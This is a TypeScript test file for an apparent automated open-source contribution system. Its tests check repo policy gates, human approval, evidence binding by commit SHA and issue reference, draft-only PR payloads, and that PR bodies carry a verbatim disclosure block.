import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { pathToFileURL } from "node:url";
import { after, test } from "node:test";
import { ALLOWLIST, CAPS, repoById } from "./allowlist.ts";
import {
  applyAdvance,
  applyApprove,
  applyAttachDraft,
  applyAttachEvidence,
  applyHalt,
  applyPrSync,
  applyReviewObservation,
  applyQueueLive,
  applyReject,
  applyRevert,
  applyTick,
  bindingFromCompare,
  branchMentionsIssue,
  classifyCompetition,
  commitTrailerViolation,
  evidenceIsReady,
  findCompetingPull,
  hasInflight,
  isBoundSha,
  isPlaceholderSha,
  issueStandDownReason,
  maySelectRepo,
  mentionsIssue,
  referencesIssue,
  repoHealth,
  type EvidenceBinding,
} from "./engine.ts";
import { draftPullPayload } from "./github-pr.ts";
import { packetChecks, packetDivergences } from "./ledger-check.ts";
import {
  commandTools,
  isTestPath,
  runFailureDetail,
  toolchainLabel,
  verifyWitnessLogs,
  witnessEvidence,
} from "./witness.ts";
import { DISCLOSURE, FOUNDRY_REPO_URL } from "./neighbor.ts";
import { buildPacket, renderEvidencePage, renderPrBody } from "./packet.ts";
import { evaluatePolicy } from "./policy.ts";
import { runSandboxDry } from "./sandbox.ts";
import {
  applyPacketToScorecard,
  applyReviewToScorecard,
  classifyRevert,
  isTerminalReviewSubject,
  emptyScorecard,
  health,
  revertNote,
  scorecardRow,
} from "./scorecard.ts";
import { seedState } from "./seed.ts";
import { loadFactoryState } from "./state.ts";
import type { LiveIssue as ScoutIssue } from "./github-scout.ts";
import { INFLIGHT_STATUSES, inflightCount, type FactoryState } from "./types.ts";

function blank(): FactoryState {
  return {
    version: 6,
    packets: [],
    events: [],
    scorecard: emptyScorecard(),
    ticksRun: 0,
    lastTickAt: null,
    mergedTotal: 0,
    bans: 0,
    humanApprovalsRemaining: 20,
  };
}

const BASE = "251fe899c5bd843a7dad71d908c0af3bfcea79e1";
const HEAD = "d91fe2f6725163fab8f9dd42e5c2b0c0c9f0f40d";
const OTHER = "36d0f23708adbdf911e4df050ed516821278a9fc";
function bindingFor(
  packet: { issueNumber: number; issueUrl: string },
  extra: Partial<EvidenceBinding> = {},
): EvidenceBinding {
  return {
    fastForward: true,
    messages: [`Fixes #${packet.issueNumber}`],
    filesChanged: 1,
    diffLines: 1,
    ...extra,
  };
}

function witnessed(repoId = "ravidsrk/orca-fleet", packetId = "pkt_ravidsrk_orca-fleet_71") {
  return {
    provider: "host" as const,
    testExit: 0,
    revertExit: 1,
    testLogSha: "c".repeat(64),
    revertLogSha: "d".repeat(64),
    ranAt: "2026-08-28T16:00:00.000Z",
    repoId,
    baseSha: BASE,
    headSha: HEAD,
    testLogPath: `docs/evidence/logs/${packetId}/test.log`,
    revertLogPath: `docs/evidence/logs/${packetId}/revert.log`,
  };
}

function live(
  repoId: string,
  number: number,
  title = "docs tweak",
): ScoutIssue {
  return {
    repoId,
    number,
    title,
    url: `https://github.com/${repoId}/issues/${number}`,
    labels: [],
    daysOld: 1,
    scout: { total: 1, parts: { wave: 0, labels: 0, size: 0, freshness: 0 } },
  };
}

test("denylist and unlisted repos are refused by policy", () => {
  const banned = evaluatePolicy({ repoId: "matplotlib/matplotlib", issueTitle: "typo" });
  assert.equal(banned.allow, false);
  assert.equal(banned.code, "DENY_FORBIDDEN");
  const unlisted = evaluatePolicy({ repoId: "random/slop-magnet", issueTitle: "typo" });
  assert.equal(unlisted.allow, false);
  assert.equal(unlisted.code, "DENY_UNKNOWN_POLICY");
});

test("unknown policy without fetched docs is deny, not a canned welcome", () => {
  const v = evaluatePolicy({ repoId: "mcp-use/mcp-use", issueTitle: "docs" });
  assert.equal(v.allow, false);
  assert.equal(v.code, "DENY_UNKNOWN_POLICY");
  const packet = buildPacket({
    repoId: "mcp-use/mcp-use",
    issueNumber: 1,
    issueTitle: "docs",
    issueUrl: "https://github.com/mcp-use/mcp-use/issues/1",
  });
  assert.equal(packet.status, "parked");
  assert.equal(packet.policy.code, "DENY_UNKNOWN_POLICY");
});

test("submitted packet is in-flight and blocks a new tick", () => {
  const seed = seedState();
  assert.equal(hasInflight(seed.packets), true);
  const submitted = seed.packets.find((p) => p.status === "submitted");
  assert.ok(submitted);
  assert.equal(submitted.prUrl, "https://github.com/ColeMurray/background-agents/pull/1652");
  const ticked = applyTick(seed);
  assert.equal(ticked.packet, null);
  assert.equal(ticked.reason, "in-flight");
  const queued = applyQueueLive(seed, live("ravidsrk/frontguard", 999));
  assert.equal(queued.packet, null);
  assert.equal(queued.reason, "in-flight");
});

test("Wave 1 cannot start before two attested Wave 0 merges", () => {
  const queued = applyQueueLive(blank(), live("ColeMurray/background-agents", 1476, "icon"));
  assert.equal(queued.packet, null);
  assert.match(queued.reason, /two Foundry-attested Wave 0 merges/);
  const ticked = applyTick(blank(), [live("ColeMurray/background-agents", 1476, "icon")]);
  if (ticked.packet) {
    assert.notEqual(ticked.packet.repoId, "ColeMurray/background-agents");
  }
});

test("scorecard halt stop blocks queue and approve", () => {
  const state = blank();
  state.scorecard = state.scorecard.map((row) =>
    row.repoId === "ravidsrk/orca-fleet"
      ? { ...row, opened: CAPS.halt_after_opens, merged: 0, closedUnmerged: CAPS.halt_after_opens, maintainerTone: "neutral" as const }
      : row,
  );
  assert.equal(health(state.scorecard.find((r) => r.repoId === "ravidsrk/orca-fleet")!), "stop");
  const queued = applyQueueLive(state, live("ravidsrk/orca-fleet", 80));
  assert.equal(queued.packet, null);
  assert.match(queued.reason, /halted/);
});

test("tick idles instead of inventing #9000+ issues", () => {
  const seed = seedState();
  const consumedFirstIssue = {
    ...seed.packets[0],
    id: "pkt_github_awesome-copilot_2684",
    repoId: "github/awesome-copilot",
    issueNumber: 2684,
    status: "parked" as const,
  };
  const quiet = {
    ...seed,
    packets: [consumedFirstIssue, ...seed.packets].map((p) =>
      p.status === "submitted" ? { ...p, status: "followed-up" as const } : p,
    ),
  };
  assert.equal(hasInflight(quiet.packets), false);
  const ticked = applyTick(quiet);
  assert.equal(ticked.packet, null);
  assert.equal(ticked.reason, "idle");
  assert.equal(ticked.state.packets.length, quiet.packets.length);
  assert.equal(
    ticked.state.packets.map((p) => `${p.repoId}#${p.issueNumber}`).join(","),
    quiet.packets.map((p) => `${p.repoId}#${p.issueNumber}`).join(","),
  );
});

test("approve cannot green-light a denied packet", () => {
  const denied = buildPacket({
    repoId: "matplotlib/matplotlib",
    issueNumber: 1,
    issueTitle: "typo",
    issueUrl: "https://github.com/matplotlib/matplotlib/issues/1",
  });
  const state: FactoryState = {
    ...blank(),
    packets: [{ ...denied, status: "gated", station: "freeze" }],
  };
  const result = applyApprove(state, denied.id, "please");
  assert.ok(result.error);
  assert.match(result.error, /DENY_FORBIDDEN/);
  assert.equal(result.state.packets[0].status, "gated");
  assert.equal(result.state.packets[0].humanAttest, undefined);
});

test("reject refuses a merged packet instead of desyncing the promotion gate", () => {
  const seed = seedState();
  const merged = seed.packets.find((p) => p.status === "merged")!;
  const before = seed.mergedTotal;
  const result = applyReject(seed, merged.id, "typo'd reject");
  assert.ok(result.error);
  assert.match(result.error, /merged/i);
  // Refused outright: state is untouched, not just the one packet.
  assert.equal(result.state, seed);
  assert.equal(result.state.packets.find((p) => p.id === merged.id)?.status, "merged");
  assert.equal(result.state.mergedTotal, before);
});

test("reject stays legal on a submitted packet (the documented halt-everything path) but names the still-open PR", () => {
  const seed = seedState();
  const submitted = seed.packets.find((p) => p.status === "submitted")!;
  assert.ok(submitted.prUrl);
  const result = applyReject(seed, submitted.id, "operator halt");
  assert.equal(result.error, undefined);
  const after = result.state.packets.find((p) => p.id === submitted.id)!;
  assert.equal(after.status, "rejected");
  // Loud: the packet record itself names the abandoned PR...
  assert.ok(after.parkReason?.includes(submitted.prUrl!));
  // ...and so does the event a human or the ledger reads afterward.
  assert.equal(result.state.events[0].packetId, submitted.id);
  assert.ok(result.state.events[0].message.includes(submitted.prUrl!));
  // Rejecting a still-open PR must not pretend it is closed.
  assert.equal(hasInflight(result.state.packets), false);
});

test("advance does not stamp placeholder SHA or auto-harvest", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  const implementing = state.packets[0];
  assert.equal(implementing.status, "implementing");
  assert.equal(implementing.sandboxSession?.status, "dry-run");
  assert.ok(implementing.sandboxSession?.commands.every((c) => c.exit !== 0));
  const dry = runSandboxDry(implementing);
  assert.equal(dry.status, "dry-run");
  assert.notEqual(dry.status, "harvested");

  state = applyAdvance(state, id).state;
  assert.equal(state.packets[0].status, "reviewing");
  assert.equal(state.packets[0].evidence, undefined);
  const blocked = applyAdvance(state, id);
  assert.ok(blocked.error);
  assert.match(blocked.error, /evidence/);

  const fake = applyAttachEvidence(state, id, {
    baseSha: "origin/HEAD",
    headSha: `deadbeef${id.slice(-4)}`,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0]));
  assert.ok(fake.error);
  assert.equal(isPlaceholderSha("deadbeefab"), true);
  assert.equal(isBoundSha(HEAD), true);
  assert.equal(isPlaceholderSha(HEAD), false);

  const fabricated = applyAttachEvidence(state, id, {
    baseSha: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    headSha: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0]));
  assert.ok(fabricated.error);
  assert.match(fabricated.error, /placeholder|not found/i);

  const unknownHex = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: "c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1",
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0], { fastForward: false }));
  assert.ok(unknownHex.error);
  assert.match(unknownHex.error, /fast-forward/);

  const unrelatedExisting = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: OTHER,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0], { messages: ["unrelated refactor"] }));
  assert.ok(unrelatedExisting.error);
  assert.match(unrelatedExisting.error, /does not reference/);

  // A plain reference *is* a binding, for evidence purposes (issue #42). This assertion used to
  // read the other way, and under it the factory's own merged Wave-0 range — whose only mention of
  // the issue is `(issue #71)` — was refused by the gate the factory enforces. Closing keywords
  // stay required where GitHub's auto-close semantics actually apply: the PR body, checked by
  // `applyAttachDraft` (the `casualPr` case below still refuses).
  const plainReference = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: OTHER,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0], { messages: [`see also #${state.packets[0].issueNumber}`] }));
  assert.equal(plainReference.error, undefined, plainReference.error);
  assert.equal(plainReference.state.packets[0].evidence?.shaVerified, true);

  const foreignRepo = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: OTHER,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, bindingFor(state.packets[0], {
    messages: [`Fixes other-owner/other-repo#${state.packets[0].issueNumber}`],
  }));
  assert.ok(foreignRepo.error);
  assert.match(foreignRepo.error, /does not reference/);

  state = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: ["operator-harvested"],
    witness: witnessed(),
  }, bindingFor(state.packets[0])).state;
  assert.equal(evidenceIsReady(state.packets[0]), true);
  state = applyAdvance(state, id).state;
  assert.equal(state.packets[0].status, "draft-ready");
  assert.ok(state.packets[0].prBody?.includes(DISCLOSURE));
});

test("mentionsIssue rejects a foreign owner/repo with the same issue number", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const repo = "ravidsrk/orca-fleet";
  assert.equal(mentionsIssue("Fixes #71", 71, url, repo), true);
  assert.equal(mentionsIssue("Fixes ravidsrk/orca-fleet#71", 71, url, repo), true);
  assert.equal(mentionsIssue(`Fixes ${url}`, 71, url, repo), true);
  assert.equal(mentionsIssue("Fixes other-owner/other-repo#71", 71, url, repo), false);
  assert.equal(mentionsIssue("Closes matplotlib/matplotlib#71", 71, url, repo), false);
  // A longer issue number whose URL merely *starts* with ours is a different issue. The keyword
  // path matched it by substring, so `Fixes .../issues/710` bound packet #71 (issue #42).
  assert.equal(mentionsIssue(`Fixes ${url}0`, 71, url, repo), false);
});

// --- Evidence binding: the reference forms the project itself ships (issue #42) ---

/**
 * The factory's own merged Wave-0 range. `ravidsrk/orca-fleet` PR #72: base 36d0f23, head 8c7068a,
 * merged. Read live with `gh api repos/ravidsrk/orca-fleet/pulls/72/commits` on 2026-08-29 and
 * reproduced byte-for-byte below — its only mention of the issue is `(issue #71)`, no closing
 * keyword. Under the keyword-only rule this exact range, already shipped and reviewed and merged
 * by this project, was refused by the gate this project enforces: `commit range does not close
 * ravidsrk/orca-fleet#71`.
 */
const MERGED_BASE = "36d0f23708adbdf911e4df050ed516821278a9fc";
const MERGED_HEAD = "8c7068a5467a283de524c88e549dfa66782eeec2";
const MERGED_MESSAGE = [
  "fix(validate): one unreadable SKILL.md must not abort the catalog",
  "",
  "Wrap SKILL.md and playbook/runtime reads so UnicodeDecodeError / OSError",
  "become a one-item per-file error. Fixture tests lock the branch (issue #71).",
  "",
  "Prepared by Foundry. Draft only. Foundry does not merge.",
].join("\n");

test("the factory's own merged Wave-0 range attaches as evidence", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];
  assert.equal(packet.repoId, "ravidsrk/orca-fleet", "the regression fixture is the Wave 0 packet");
  assert.equal(packet.issueNumber, 71);

  const attached = applyAttachEvidence(
    state,
    id,
    {
      baseSha: MERGED_BASE,
      headSha: MERGED_HEAD,
      testCommand: "true",
      testExit: 0,
      negativeControl: "red-on-revert",
      filesChanged: 1,
      diffLines: 1,
      notes: [],
      witness: { ...witnessed(), baseSha: MERGED_BASE, headSha: MERGED_HEAD },
    },
    bindingFor(packet, { messages: [MERGED_MESSAGE] }),
  );
  assert.equal(attached.error, undefined, attached.error);
  assert.equal(attached.state.packets[0].evidence?.shaVerified, true);
  assert.equal(evidenceIsReady(attached.state.packets[0]), true, "and it reaches the promotion gate");
});

/**
 * The whole surface of the relaxation, in one table: what the *commit-range* gate binds, and what
 * the *PR-body* gate (`mentionsIssue`, still keyword-only, still the rule `applyAttachDraft`
 * enforces) binds, for the same text. `bind` in the second column and not the first is exactly the
 * set the change opened; every such row names this packet's own repo and its own issue number.
 */
const BINDING_TABLE: { text: string; range: boolean; prBody: boolean; note: string }[] = [
  { text: "Fixes #71", range: true, prBody: true, note: "closing keyword, bare" },
  { text: "Closes #71", range: true, prBody: true, note: "closing keyword, bare" },
  { text: "resolved #71", range: true, prBody: true, note: "closing keyword, past tense" },
  { text: "Fixes ravidsrk/orca-fleet#71", range: true, prBody: true, note: "keyword + own repo prefix" },
  {
    text: "Fixes https://github.com/ravidsrk/orca-fleet/issues/71",
    range: true,
    prBody: true,
    note: "keyword + issue URL",
  },
  { text: MERGED_MESSAGE, range: true, prBody: false, note: "the real merged PR #72 range: `(issue #71)`" },
  { text: "issue #71", range: true, prBody: false, note: "plain `issue #N`" },
  { text: "see also #71", range: true, prBody: false, note: "bare #N" },
  { text: "#71", range: true, prBody: false, note: "bare #N alone" },
  { text: "ravidsrk/orca-fleet#71", range: true, prBody: false, note: "own repo prefix, no keyword" },
  {
    text: "context: https://github.com/ravidsrk/orca-fleet/issues/71",
    range: true,
    prBody: false,
    note: "issue URL, no keyword",
  },
  {
    text: "PR #71 tracks this",
    range: true,
    prBody: false,
    note: "over-inclusive by design: a pull number that collides with the issue number still binds",
  },
  {
    text: "Fixes #71abc",
    range: true,
    prBody: true,
    note: "pre-existing over-inclusion in BOTH matchers: `(?!\\d)` guards digits, not letters",
  },
  { text: "##71", range: true, prBody: false, note: "stray sigil; still this repo's #71 token" },
  { text: "Fixes other-owner/other-repo#71", range: false, prBody: false, note: "FOREIGN repo" },
  { text: "other-owner/other-repo#71", range: false, prBody: false, note: "FOREIGN repo, no keyword" },
  { text: "Closes matplotlib/matplotlib#71", range: false, prBody: false, note: "FOREIGN, denylisted repo" },
  { text: "ravidsrk/orca-fleet-mirror#71", range: false, prBody: false, note: "near-neighbour repo name" },
  { text: "Fixes #72", range: false, prBody: false, note: "different issue, same repo" },
  { text: "see also #710", range: false, prBody: false, note: "longer number, same repo" },
  {
    text: "https://github.com/ravidsrk/orca-fleet/issues/710",
    range: false,
    prBody: false,
    note: "different issue number inside a URL",
  },
  {
    text: "https://github.com/ravidsrk/orca-fleet/pull/71",
    range: false,
    prBody: false,
    note: "the number lives in a pull URL, not the issue URL",
  },
  { text: "unrelated refactor", range: false, prBody: false, note: "no reference at all" },
];

test("the evidence gate binds plain references and nothing foreign or misnumbered", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];
  const url = packet.issueUrl;
  assert.equal(url, "https://github.com/ravidsrk/orca-fleet/issues/71");

  for (const row of BINDING_TABLE) {
    const attached = applyAttachEvidence(
      state,
      id,
      {
        baseSha: BASE,
        headSha: HEAD,
        testCommand: "true",
        testExit: 0,
        negativeControl: "red-on-revert",
        filesChanged: 1,
        diffLines: 1,
        notes: [],
      },
      bindingFor(packet, { messages: [row.text] }),
    );
    const bound = attached.error === undefined;
    assert.equal(bound, row.range, `range binding for ${JSON.stringify(row.text)} (${row.note}): ${attached.error ?? "bound"}`);
    if (!bound) assert.match(attached.error!, /does not reference/, row.note);
    // The PR body keeps GitHub's own rule, unrelaxed — that is where auto-close semantics live.
    assert.equal(
      mentionsIssue(row.text, packet.issueNumber, url, packet.repoId),
      row.prBody,
      `PR-body binding for ${JSON.stringify(row.text)} (${row.note})`,
    );
  }

  // Nothing foreign is anywhere in the accepted set — the relaxation is same-repo only.
  for (const row of BINDING_TABLE.filter((r) => r.range)) {
    assert.doesNotMatch(row.text, /other-owner|matplotlib|orca-fleet-mirror/, row.note);
  }
});

test("renderPrBody embeds verbatim disclosure; create payload is draft-only", () => {
  const packet = buildPacket({
    repoId: "ravidsrk/orca-fleet",
    issueNumber: 42,
    issueTitle: "changelog",
    issueUrl: "https://github.com/ravidsrk/orca-fleet/issues/42",
    agentsMd: "Agents may open draft PRs.",
  });
  const body = renderPrBody(packet);
  assert.ok(body.includes(DISCLOSURE));
  const payload = draftPullPayload({ title: "t", head: "foundry/x", body });
  assert.equal(payload.draft, true);
  assert.equal("merge" in payload, false);
});

test("attach-draft rejects a non-PR URL, wrong repo, or ready PR", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  state = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
    witness: witnessed(),
  }, bindingFor(state.packets[0])).state;
  state = applyAdvance(state, id).state;
  assert.equal(state.packets[0].status, "draft-ready");
  const openedBefore = state.scorecard.find((r) => r.repoId === state.packets[0].repoId)?.opened ?? 0;

  const typo = applyAttachDraft(state, id, "not-a-url", { draft: true });
  assert.ok(typo.error);
  assert.match(typo.error, /Not a GitHub pull request URL/);

  const otherRepo = applyAttachDraft(
    state,
    id,
    "https://github.com/matplotlib/matplotlib/pull/1",
    { draft: true },
  );
  assert.ok(otherRepo.error);
  assert.match(otherRepo.error, /does not match packet repo/);

  const foreignOwner = applyAttachDraft(
    state,
    id,
    `https://github.com/stranger/${state.packets[0].repoId.split("/")[1]}/pull/1`,
    { draft: true },
  );
  assert.ok(foreignOwner.error);
  assert.match(foreignOwner.error, /does not match packet repo/);
  assert.equal(foreignOwner.state.packets[0].status, "draft-ready");
  assert.equal(
    foreignOwner.state.scorecard.find((r) => r.repoId === state.packets[0].repoId)?.opened ?? 0,
    openedBefore,
  );

  const ready = applyAttachDraft(
    state,
    id,
    `https://github.com/${state.packets[0].repoId}/pull/99`,
    { draft: false },
  );
  assert.ok(ready.error);
  assert.match(ready.error, /must be a draft/);
  assert.equal(ready.state.packets[0].status, "draft-ready");
  assert.equal(
    ready.state.scorecard.find((r) => r.repoId === state.packets[0].repoId)?.opened ?? 0,
    openedBefore,
  );

  const unbound = applyAttachDraft(
    state,
    id,
    `https://github.com/${state.packets[0].repoId}/pull/99`,
    { draft: true, headSha: HEAD, title: "other work", body: "no issue link" },
  );
  assert.ok(unbound.error);
  assert.match(unbound.error, /does not close packet issue/);
  assert.equal(unbound.state.packets[0].status, "draft-ready");

  const casualPr = applyAttachDraft(
    state,
    id,
    `https://github.com/${state.packets[0].repoId}/pull/99`,
    {
      draft: true,
      headSha: HEAD,
      title: "unrelated",
      body: `see also #${state.packets[0].issueNumber} ${state.packets[0].issueUrl}`,
    },
  );
  assert.ok(casualPr.error);
  assert.match(casualPr.error, /does not close packet issue/);

  const ok = applyAttachDraft(
    state,
    id,
    `https://github.com/${state.packets[0].repoId}/pull/99`,
    {
      draft: true,
      headSha: HEAD,
      title: `fix #${state.packets[0].issueNumber}`,
      // The disclosure block is now part of what makes a body attachable (SPEC.md §6, issue #38);
      // the refusal it added has its own test below.
      body: `Fixes #${state.packets[0].issueNumber}\n\n${DISCLOSURE}`,
    },
  );
  assert.equal(ok.error, undefined);
  assert.equal(ok.state.packets[0].status, "submitted");
});

function reviewing(): { state: FactoryState; id: string } {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  return { state, id };
}

function readyEvidence(
  packet: { issueNumber: number; issueUrl: string },
  extra: { filesChanged?: number; diffLines?: number } = {},
) {
  const filesChanged = extra.filesChanged ?? 1;
  const diffLines = extra.diffLines ?? 1;
  return {
    evidence: {
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "true",
      testExit: 0,
      negativeControl: "red-on-revert" as const,
      filesChanged,
      diffLines,
      notes: [],
      witness: witnessed(),
    },
    binding: bindingFor(packet, { filesChanged, diffLines }),
  };
}

test("evidence attach is refused outside review and over-cap ranges are parked", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  const gated = applyAttachEvidence(state, id, readyEvidence(state.packets[0]).evidence, readyEvidence(state.packets[0]).binding);
  assert.ok(gated.error);
  assert.match(gated.error!, /reviewing/);
  assert.equal(gated.state.packets[0].status, "gated");

  const reviewingState = reviewing();
  const packet = reviewingState.state.packets[0];
  const over = applyAttachEvidence(
    reviewingState.state,
    reviewingState.id,
    readyEvidence(packet, { filesChanged: 9, diffLines: 1 }).evidence,
    readyEvidence(packet, { filesChanged: 9, diffLines: 1 }).binding,
  );
  assert.ok(over.error);
  assert.match(over.error!, /park|cap|scope/i);
  assert.equal(over.state.packets[0].status, "parked");
  assert.equal(over.state.packets[0].class, "out-of-scope");
  assert.equal(over.state.packets[0].evidence, undefined);
});

test("attach-draft requires the PR head to match reviewed evidence", () => {
  const started = reviewing();
  const packet = started.state.packets[0];
  const ready = readyEvidence(packet);
  let state = applyAttachEvidence(started.state, started.id, ready.evidence, ready.binding).state;
  state = applyAdvance(state, started.id).state;
  const url = `https://github.com/${state.packets[0].repoId}/pull/99`;
  const n = state.packets[0].issueNumber;

  const missing = applyAttachDraft(state, started.id, url, {
    draft: true,
    title: `Fixes #${n}`,
    body: `Fixes #${n}`,
  });
  assert.ok(missing.error);
  assert.match(missing.error!, /head SHA is required/);
  assert.equal(missing.state.packets[0].status, "draft-ready");

  const mismatch = applyAttachDraft(state, started.id, url, {
    draft: true,
    headSha: OTHER,
    title: `Fixes #${n}`,
    body: `Fixes #${n}`,
  });
  assert.ok(mismatch.error);
  assert.match(mismatch.error!, /does not match evidence head/);
  assert.equal(mismatch.state.packets[0].status, "draft-ready");
});

/**
 * The block ColeMurray/background-agents#1652 actually carries: the current constant minus the
 * repo qualifier ADR 0004 added while that PR was already open. Derived from `DISCLOSURE` rather
 * than re-typed, so it cannot drift into a copy of it — and asserted different below, because a
 * derivation that stopped substituting would make every assertion using it vacuous.
 */
const SHORTENED_DISCLOSURE = DISCLOSURE.replace(" (ravidsrk/oss-foundry)", "");

/** A live PR body that satisfies SPEC.md §6 — the current block, verbatim and unabridged. */
const VERBATIM_BODY = `## Summary\n\nFixes the thing.\n\n## Disclosure\n\n${DISCLOSURE}\n`;

/**
 * SPEC.md §6: "The PR body MUST disclose ... verbatim and unabridged."
 *
 * `open-draft` refuses a body without the block before its POST (factory/cli.ts). `attach-draft` —
 * the path for a manually/browser-opened PR, kept alive because the App still 403s on stranger
 * repos (docs/07-github-app.md) — had no such check in the CLI or here, so the one MUST that
 * governs the moment of contact was unguarded on the only route still in use for those repos.
 *
 * That is not hypothetical: docs/PRODUCT.md §8 records that #1652 was opened from a browser with a
 * shortened disclosure. The refusal has to live in the reducer, not in `cli.ts`, because both
 * create paths funnel through here — `open-draft` records its own POST through this same function.
 * Issue #38.
 */
/**
 * Policy item 3 beside the constant (`factory/neighbor.ts`): a change to `DISCLOSURE` obliges
 * every doc that quotes it to move with it. The two in-repo copies are the ones this tree can
 * actually enforce — a live PR body upstream is grandfathered and reported instead — so they are
 * checked byte-for-byte here. Without this, the docs that show a maintainer "the block" could
 * quietly become a third version nobody ships. Issue #38.
 */
test("every in-repo quotation of the disclosure block is the constant, byte for byte", () => {
  const quoting = ["../docs/02-good-neighbor.md", "../docs/PRODUCT.md"];
  for (const rel of quoting) {
    const doc = readFileSync(new URL(rel, import.meta.url), "utf8");
    assert.ok(
      doc.includes(DISCLOSURE),
      `${rel} quotes a disclosure block that is not \`DISCLOSURE\` — a doc showing maintainers a version this factory does not send`,
    );
  }
  // ...and the list is not empty of its own accord: a rename that moved these files would leave
  // the loop above iterating over nothing and passing.
  assert.equal(quoting.length, 2, "both quoting docs must stay in the list");
});

test("attach-draft refuses a PR body without the verbatim disclosure block", () => {
  const started = reviewing();
  const packet = started.state.packets[0];
  const ready = readyEvidence(packet);
  let state = applyAttachEvidence(started.state, started.id, ready.evidence, ready.binding).state;
  state = applyAdvance(state, started.id).state;
  const repoId = state.packets[0].repoId;
  const url = `https://github.com/${repoId}/pull/99`;
  const n = state.packets[0].issueNumber;
  const openedBefore = state.scorecard.find((r) => r.repoId === repoId)?.opened ?? 0;
  const attach = (body: string) =>
    applyAttachDraft(state, started.id, url, { draft: true, headSha: HEAD, title: `Fixes #${n}`, body });

  // The executed repro from issue #38: a body that closes the issue and carries zero disclosure
  // text was bound, `error: undefined`, and the packet moved to `submitted`.
  const bare = attach(`Fixes #${n}\n\nSee the issue for context, nothing else to say here.`);
  assert.ok(bare.error, "a body with no disclosure at all must not bind to a packet");
  assert.match(bare.error!, /verbatim disclosure/);
  assert.equal(bare.state.packets[0].status, "draft-ready");
  assert.equal(
    bare.state.scorecard.find((r) => r.repoId === repoId)?.opened ?? 0,
    openedBefore,
    "a refused attach must not score an opened PR",
  );

  // "Unabridged" is the other half of the MUST, and the half #1652 actually missed: a Foundry
  // disclosure that is not THIS block is still a violation, so the check is a substring of the
  // whole constant and not a keyword sniff.
  assert.notEqual(
    SHORTENED_DISCLOSURE,
    DISCLOSURE,
    "the shortened form no longer differs from the constant — re-derive it or this assertion is vacuous",
  );
  const shortened = attach(`Fixes #${n}\n\n${SHORTENED_DISCLOSURE}`);
  assert.ok(shortened.error, "an abridged disclosure must not bind either");
  assert.match(shortened.error!, /verbatim disclosure/);
  assert.equal(shortened.state.packets[0].status, "draft-ready");

  // ...and the verbatim block binds, so the gate refuses bodies rather than refusing everything.
  const ok = attach(`Fixes #${n}\n\n${DISCLOSURE}`);
  assert.equal(ok.error, undefined, ok.error);
  assert.equal(ok.state.packets[0].status, "submitted");
});

test("tick skips issues that already have a competing PR", () => {
  const ticked = applyTick(blank(), [], ["ravidsrk/orca-fleet#71"]);
  assert.ok(ticked.packet);
  assert.notEqual(`${ticked.packet.repoId}#${ticked.packet.issueNumber}`, "ravidsrk/orca-fleet#71");

  const queued = applyQueueLive(blank(), live("ravidsrk/orca-fleet", 80), undefined, {
    kind: "competing",
    url: "https://github.com/ravidsrk/orca-fleet/pull/2",
    why: "closing-keyword",
  });
  assert.equal(queued.packet, null);
  assert.equal(queued.reason, "already-has-pr");
});

/**
 * `applyTick` carries the two-tier verdict (`competingKeys` stand down, `adjacentKeys` hold for
 * human triage). `applyQueueLive` took a single `competingPr: boolean`, which can only say "stand
 * down" or "go" — an adjacent mention had to be flattened into one of those, and flattening it to
 * `false` queues the packet and loses the taste gate silently. The queue path is not wired into
 * `cli.ts` today, so nothing was broken; the point is that wiring it later must not be able to
 * lose the distinction (issue #44 item 8).
 */
test("applyQueueLive keeps the two-tier competing verdict instead of one boolean", () => {
  const issue = live("ravidsrk/orca-fleet", 80);

  const adjacent = applyQueueLive(blank(), issue, undefined, {
    kind: "adjacent",
    url: "https://github.com/ravidsrk/orca-fleet/pull/3",
    why: "plain-mention",
  });
  assert.equal(adjacent.packet, null, "an adjacent mention is a hold, not a green light");
  assert.equal(adjacent.reason, "adjacent-hold");
